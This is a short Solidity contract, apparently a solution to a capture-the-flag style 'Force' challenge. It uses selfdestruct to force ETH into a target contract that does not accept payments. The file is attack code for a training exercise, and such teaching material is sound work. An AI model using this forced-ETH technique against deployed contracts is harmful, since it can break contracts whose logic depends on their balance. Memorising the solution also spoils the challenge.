// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    Force private forceContract;
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
        forceContract = Force(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        // this should destroy ourselves while forcing our ETH onto the force contract
        address payable payableForceAddress = payable(contractAddress);
        selfdestruct(payableForceAddress);
    }
}
